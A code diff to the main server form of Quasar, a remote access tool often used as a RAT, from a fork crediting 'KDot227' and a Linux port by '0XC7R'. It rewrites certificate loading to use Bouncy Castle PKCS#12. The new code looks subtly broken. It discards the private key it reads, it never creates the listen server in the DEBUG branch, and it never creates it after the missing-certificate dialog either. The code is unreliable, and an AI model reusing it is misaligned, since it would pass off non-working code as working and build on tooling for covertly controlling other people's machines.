@@ -22,12 +22,13 @@ using System.Threading;
 using System.Windows.Forms;
 using Quasar.Common.Messages.QuickCommands;
 using System.IO;
+using Org.BouncyCastle.Pkcs;
 
 namespace Quasar.Server.Forms
 {
     public partial class FrmMain : Form
     {
-        public QuasarServer ListenServer { get; set; }
+        public QuasarServer ListenServer;
 
         private const int STATUS_ID = 4;
         private const int CURRENTWINDOW_ID = 5;
@@ -84,9 +85,9 @@ namespace Quasar.Server.Forms
                 {
                     int selected = lstClients.SelectedItems.Count;
                     this.Text = (selected > 0)
-                        ? string.Format("Quasar - Modded by KDot227 - Connected: {0} [Selected: {1}]", ListenServer.ConnectedClients.Length,
+                        ? string.Format("Quasar - Modded by KDot227 | Linux port by 0XC7R - Connected: {0} [Selected: {1}]", ListenServer.ConnectedClients.Length,
                             selected)
-                        : string.Format("Quasar - Modded by KDot227 - Connected: {0}", ListenServer.ConnectedClients.Length);
+                        : string.Format("Quasar Modded (KDOT/0XC7R Linux Port) - Connected: {0}", ListenServer.ConnectedClients.Length);
                 });
             }
             catch (Exception)
@@ -97,36 +98,70 @@ namespace Quasar.Server.Forms
 
         private void InitializeServer()
         {
-            X509Certificate2 serverCertificate;
-#if DEBUG
-            serverCertificate = new DummyCertificate();
-#else
-            if (!File.Exists(Settings.CertificatePath))
+            try
             {
-                using (var certificateSelection = new FrmCertificate())
+                #if DEBUG
+                X509Certificate2 serverCertificate;
+                serverCertificate = new DummyCertificate();
+                #else
+
+                if (!File.Exists(Settings.CertificatePath))
                 {
-                    while (certificateSelection.ShowDialog() != DialogResult.OK)
-                    { }
+                    Debug.WriteLine("CertificatePath is empty.");
+                    using (var certificateSelection = new FrmCertificate())
+                    {
+                        while (certificateSelection.ShowDialog() != DialogResult.OK)
+                        { }
+                    }
                 }
+                else
+                {
+                    // Load the certificate using Bouncy Castle
+                    try
+                    {
+                        byte[] certData = File.ReadAllBytes(Settings.CertificatePath);
+                        // If the certificate is password-protected, provide the password here
+                        string password = "";
+                        var pkcs12 = new Pkcs12Store();
+                        using (var stream = new MemoryStream(certData))
+                        {
+                            pkcs12.Load(stream, password.ToCharArray());
+                        }
+
+                        // Get the first certificate and its private key
+                        string alias = pkcs12.Aliases.Cast<string>().FirstOrDefault();
+                        if (alias != null)
+                        {
+                            var certificate = pkcs12.GetCertificate(alias).Certificate;
+                            var privateKey = pkcs12.GetKey(alias).Key;
+
+                            // Convert Bouncy Castle certificate to X509Certificate2
+                            serverCertificate = new X509Certificate2(certificate.GetEncoded());
+
+                            ListenServer = new QuasarServer(serverCertificate);
+                            ListenServer.ServerState += ServerState;
+                            ListenServer.ClientConnected += ClientConnected;
+                            ListenServer.ClientDisconnected += ClientDisconnected;
+                        }
+                        else
+                        {
+                            throw new Exception("No certificate found in the PKCS#12 store.");
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        Debug.WriteLine($"Error loading certificate: {ex.Message}");
+                        throw; // Rethrow or handle as appropriate
+                    }
+                }
+            #endif
+
             }
-            serverCertificate = new X509Certificate2(Settings.CertificatePath);
-#endif
-            /*var str = Convert.ToBase64String(serverCertificate.Export(X509ContentType.Cert));
+            catch (Exception e)
+            {
+                MessageBox.Show(this, $"Error encountered: {e.Message}\n{e.StackTrace} ");
+            }
 
-            var cert2 = new X509Certificate2(Convert.FromBase64String(str));
-            var serverCsp = (RSACryptoServiceProvider)serverCertificate.PublicKey.Key;
-            var connectedCsp = (RSACryptoServiceProvider)new X509Certificate2(cert2).PublicKey.Key;
-
-            var result = serverCsp.ExportParameters(false);
-            var result2 = connectedCsp.ExportParameters(false);
-
-            var b = SafeComparison.AreEqual(result.Exponent, result2.Exponent) &&
-                    SafeComparison.AreEqual(result.Modulus, result2.Modulus);*/
-
-            ListenServer = new QuasarServer(serverCertificate);
-            ListenServer.ServerState += ServerState;
-            ListenServer.ClientConnected += ClientConnected;
-            ListenServer.ClientDisconnected += ClientDisconnected;
         }
 
         private void StartConnectionListener()
